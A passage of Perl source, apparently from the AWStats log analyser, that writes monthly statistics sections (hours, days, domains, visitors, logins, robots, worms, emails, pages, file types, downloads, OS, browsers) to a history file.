$NbOfOldLines $NbOfNewLines $NbOfLinesCorrupted $NbOfLinesDropped${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}TotalVisits${xmlrs}\";\n\t\t$PosInFile{\"TotalVisits\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}TotalUnique${xmlrs}\";\n\t\t$PosInFile{\"TotalUnique\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}MonthHostsKnown${xmlrs}\";\n\t\t$PosInFile{\"MonthHostsKnown\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}MonthHostsUnknown${xmlrs}\";\n\t\t$PosInFile{\"MonthHostsUnknown\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmleb}\"\n\t\t  . ( ${xmleb} ? \"\\n\" : \"\" )\n\t\t  . \"END_GENERAL${xmlee}\\n\"\n\t\t  ; # END_GENERAL on a new line following xml tag because END_ detection does not work like other sections\n\t}\n\n\t# When\n\tif ( $sectiontosave eq 'time' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\"# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_TIME${xmlbs}24${xmlbe}\\n\";\n\t\tfor ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$ix${xmlrs}\"\n\t\t\t  . int( $_time_p[$ix] )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_time_h[$ix] )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_time_k[$ix] )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_time_nv_p[$ix] )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_time_nv_h[$ix] )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_time_nv_k[$ix] )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_TIME${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'day' )\n\t{    # This section must be saved after VISITOR section is read\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Date - Pages - Hits - Bandwidth - Visits\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_DAY${xmlbs}\"\n\t\t  . ( scalar keys %DayHits )\n\t\t  . \"${xmlbe}\\n\";\n\t\tmy $monthvisits = 0;\n\t\tforeach ( sort keys %DayHits ) {\n\t\t\tif ( $_ =~ /^$year$month/i ) { # Found a day entry of the good month\n\t\t\t\tmy $page   = $DayPages{$_}  || 0;\n\t\t\t\tmy $hits   = $DayHits{$_}   || 0;\n\t\t\t\tmy $bytes  = $DayBytes{$_}  || 0;\n\t\t\t\tmy $visits = $DayVisits{$_} || 0;\n\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$_${xmlrs}$page${xmlrs}$hits${xmlrs}$bytes${xmlrs}$visits${xmlre}\\n\";\n\t\t\t\t$monthvisits += $visits;\n\t\t\t}\n\t\t}\n\t\t$MonthVisits{ $year . $month } = $monthvisits;\n\t\tprint HISTORYTMP \"${xmleb}END_DAY${xmlee}\\n\";\n\t}\n\n\t# Who\n\tif ( $sectiontosave eq 'domain' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'Domain'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Domain - Pages - Hits - Bandwidth\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'Domain'} first Pages must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_DOMAIN${xmlbs}\"\n\t\t  . ( scalar keys %_domener_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save page list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList(\n\t\t\t$MaxNbOf{'Domain'}, $MinHit{'Domain'},\n\t\t\t\\%_domener_h,       \\%_domener_p\n\t\t);\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tmy $page = $_domener_p{$_} || 0;\n\t\t\tmy $bytes = $_domener_k{$_}\n\t\t\t  || 0;    # ||0 could be commented to reduce history file size\n\t\t\tprint HISTORYTMP\n\"${xmlrb}$_${xmlrs}$page${xmlrs}$_domener_h{$_}${xmlrs}$bytes${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_domener_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tmy $page = $_domener_p{$_} || 0;\n\t\t\tmy $bytes = $_domener_k{$_}\n\t\t\t  || 0;    # ||0 could be commented to reduce history file size\n\t\t\tprint HISTORYTMP\n\"${xmlrb}$_${xmlrs}$page${xmlrs}$_domener_h{$_}${xmlrs}$bytes${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_DOMAIN${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'visitor' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'HostsShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\"# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]\\n\";\n\t\tprint HISTORYTMP\n\"# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'HostsShown'} first Hits must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_VISITOR${xmlbs}\"\n\t\t  . ( scalar keys %_host_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tmy $monthhostsknown = 0;\n\n# We save page list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \\%_host_h,\n\t\t\t\\%_host_p );\n\t\tmy %keysinkeylist = ();\n\t\tforeach my $key (@keylist) {\n\t\t\tif ( $key !~ /^\\d+\\.\\d+\\.\\d+\\.\\d+$/ && $key !~ /^[0-9A-F]*:/i ) {\n\t\t\t\t$monthhostsknown++;\n\t\t\t}\n\t\t\t$keysinkeylist{$key} = 1;\n\t\t\tmy $page      = $_host_p{$key} || 0;\n\t\t\tmy $bytes     = $_host_k{$key} || 0;\n\t\t\tmy $timehostl = $_host_l{$key} || 0;\n\t\t\tmy $timehosts = $_host_s{$key} || 0;\n\t\t\tmy $lastpage  = $_host_u{$key} || '';\n\t\t\tif ( $timehostl && $timehosts && $lastpage ) {\n\n\t\t\t\tif ( ( $timehostl + $VISITTIMEOUT ) < $LastLine ) {\n\n\t\t\t\t\t# Session for this user is expired\n\t\t\t\t\tif ($timehosts) {\n\t\t\t\t\t\t$_session{ GetSessionRange( $timehosts, $timehostl ) }\n\t\t\t\t\t\t  ++;\n\t\t\t\t\t}\n\t\t\t\t\tif ($lastpage) { $_url_x{$lastpage}++; }\n\t\t\t\t\tdelete $_host_s{$key};\n\t\t\t\t\tdelete $_host_u{$key};\n\t\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlre}\\n\";\n\t\t\t\t}\n\t\t\t\telse {\n\n\t\t\t\t\t# If this user has started a new session that is not expired\n\t\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlrs}$timehosts${xmlrs}$lastpage${xmlre}\\n\";\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tmy $hostl = $timehostl || '';\n\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$hostl${xmlre}\\n\";\n\t\t\t}\n\t\t}\n\t\tforeach my $key ( keys %_host_h ) {\n\t\t\tif ( $keysinkeylist{$key} ) { next; }\n\t\t\tif ( $key !~ /^\\d+\\.\\d+\\.\\d+\\.\\d+$/ && $key !~ /^[0-9A-F]*:/i ) {\n\t\t\t\t$monthhostsknown++;\n\t\t\t}\n\t\t\tmy $page      = $_host_p{$key} || 0;\n\t\t\tmy $bytes     = $_host_k{$key} || 0;\n\t\t\tmy $timehostl = $_host_l{$key} || 0;\n\t\t\tmy $timehosts = $_host_s{$key} || 0;\n\t\t\tmy $lastpage  = $_host_u{$key} || '';\n\t\t\tif ( $timehostl && $timehosts && $lastpage ) {\n\t\t\t\tif ( ( $timehostl + $VISITTIMEOUT ) < $LastLine ) {\n\n\t\t\t\t\t# Session for this user is expired\n\t\t\t\t\tif ($timehosts) {\n\t\t\t\t\t\t$_session{ GetSessionRange( $timehosts, $timehostl ) }\n\t\t\t\t\t\t  ++;\n\t\t\t\t\t}\n\t\t\t\t\tif ($lastpage) { $_url_x{$lastpage}++; }\n\t\t\t\t\tdelete $_host_s{$key};\n\t\t\t\t\tdelete $_host_u{$key};\n\t\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlre}\\n\";\n\t\t\t\t}\n\t\t\t\telse {\n\n\t\t\t\t\t# If this user has started a new session that is not expired\n\t\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlrs}$timehosts${xmlrs}$lastpage${xmlre}\\n\";\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tmy $hostl = $timehostl || '';\n\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$hostl${xmlre}\\n\";\n\t\t\t}\n\t\t}\n\t\t$MonthUnique{ $year . $month }       = ( scalar keys %_host_p );\n\t\t$MonthHostsKnown{ $year . $month }   = $monthhostsknown;\n\t\t$MonthHostsUnknown{ $year . $month } =\n\t\t  ( scalar keys %_host_h ) - $monthhostsknown;\n\t\tprint HISTORYTMP \"${xmleb}END_VISITOR${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'login' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'LoginShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Login - Pages - Hits - Bandwidth - Last visit\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'LoginShown'} first Pages must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_LOGIN${xmlbs}\"\n\t\t  . ( scalar keys %_login_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save login list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \\%_login_h,\n\t\t\t\\%_login_p );\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_login_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_login_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_login_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . ( $_login_l{$_} || '' )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_login_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_login_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_login_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_login_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . ( $_login_l{$_} || '' )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_LOGIN${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'robot' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'RobotShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\t\t  \"# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'RobotShown'} first Hits must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_ROBOT${xmlbs}\"\n\t\t  . ( scalar keys %_robot_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save robot list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \\%_robot_h,\n\t\t\t\\%_robot_h );\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_robot_h{$_} )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_robot_k{$_} )\n\t\t\t  . \"${xmlrs}$_robot_l{$_}${xmlrs}\"\n\t\t\t  . int( $_robot_r{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_robot_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_robot_h{$_} )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_robot_k{$_} )\n\t\t\t  . \"${xmlrs}$_robot_l{$_}${xmlrs}\"\n\t\t\t  . int( $_robot_r{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_ROBOT${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'worms' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'WormsShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Worm ID - Hits - Bandwidth - Last visit\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'WormsShown'} first Hits must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_WORMS${xmlbs}\"\n\t\t  . ( scalar keys %_worm_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save worm list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \\%_worm_h,\n\t\t\t\\%_worm_h );\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_worm_h{$_} )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_worm_k{$_} )\n\t\t\t  . \"${xmlrs}$_worm_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_worm_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_worm_h{$_} )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_worm_k{$_} )\n\t\t\t  . \"${xmlrs}$_worm_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_WORMS${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'emailsender' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'EMailsShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# EMail - Hits - Bandwidth - Last visit\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'EMailsShown'} first Hits must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_EMAILSENDER${xmlbs}\"\n\t\t  . ( scalar keys %_emails_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save sender email list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \\%_emails_h,\n\t\t\t\\%_emails_h );\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_emails_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_emails_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_emails_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_emails_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_emails_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_emails_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_emails_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_EMAILSENDER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'emailreceiver' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'EMailsShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# EMail - Hits - Bandwidth - Last visit\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'EMailsShown'} first hits must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_EMAILRECEIVER${xmlbs}\"\n\t\t  . ( scalar keys %_emailr_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save receiver email list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \\%_emailr_h,\n\t\t\t\\%_emailr_h );\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_emailr_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_emailr_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_emailr_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_emailr_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_emailr_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_emailr_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_emailr_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_EMAILRECEIVER${xmlee}\\n\";\n\t}\n\n\t# Navigation\n\tif ( $sectiontosave eq 'session' )\n\t{    # This section must be saved after VISITOR section is read\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Session range - Number of visits\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SESSION${xmlbs}\"\n\t\t  . ( scalar keys %_session )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_session ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_session{$_} )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_SESSION${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'sider' )\n\t{    # This section must be saved after VISITOR section is read\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'PageShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# URL - Pages - Bandwidth - Entry - Exit\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'PageShown'} first Pages must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SIDER${xmlbs}\"\n\t\t  . ( scalar keys %_url_p )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save page list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \\%_url_p,\n\t\t\t\\%_url_p );\n\t\t%keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tmy $newkey = $_;\n\t\t\t$newkey =~ s/([^:])\\/\\//$1\\//g\n\t\t\t  ; # Because some targeted url were taped with 2 / (Ex: //rep//file.htm). We must keep http://rep/file.htm\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($newkey)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_e{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_x{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_url_p ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tmy $newkey = $_;\n\t\t\t$newkey =~ s/([^:])\\/\\//$1\\//g\n\t\t\t  ; # Because some targeted url were taped with 2 / (Ex: //rep//file.htm). We must keep http://rep/file.htm\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($newkey)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_e{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_url_x{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_SIDER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'filetypes' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\"# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_FILETYPES${xmlbs}\"\n\t\t  . ( scalar keys %_filetypes_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_filetypes_h ) {\n\t\t\tmy $hits        = $_filetypes_h{$_}      || 0;\n\t\t\tmy $bytes       = $_filetypes_k{$_}      || 0;\n\t\t\tmy $bytesbefore = $_filetypes_gz_in{$_}  || 0;\n\t\t\tmy $bytesafter  = $_filetypes_gz_out{$_} || 0;\n\t\t\tprint HISTORYTMP\n\"${xmlrb}$_${xmlrs}$hits${xmlrs}$bytes${xmlrs}$bytesbefore${xmlrs}$bytesafter${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_FILETYPES${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'downloads' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Downloads - Hits - Bandwidth\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_DOWNLOADS${xmlbs}\"\n\t\t  . ( scalar keys %_downloads )\n\t\t  . \"${xmlbe}\\n\";\n\t\tfor my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($u)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_HITS'} || 0)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_206'} || 0)\n\t\t\t  .\"${xmlrs}\"\n\t\t\t  . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_SIZE'} || 0)\n\t\t\t  .\"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_DOWNLOADS${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'os' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# OS ID - Hits\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_OS ID - Hits - Pages${xmlbs}\"\n\t\t  . ( scalar keys %_os_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_os_h ) {\n\t\t\tmy $hits        = $_os_h{$_}      || 0;\n\t\t\tmy $pages       = $_os_p{$_}      || 0;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}$hits${xmlrs}$pages${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_OS${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'browser' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Browser ID - Hits - Pages\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_BROWSER${xmlbs}\"\n\t\t  . ( scalar keys %_browser_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_browser_h ) {\n\t\t\tmy $hits        = $_browser_h{$_}      || 0;\n\t\t\tmy $pages       = $_browser_p{$_}      || 0;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}$hits${xmlrs}$pages${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_BROWSER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'screensize' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Screen size - Hits\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SCREENSIZE${xmlbs}\"\n\t\t  . ( scalar keys %_screensize_h )\n\t\t  . 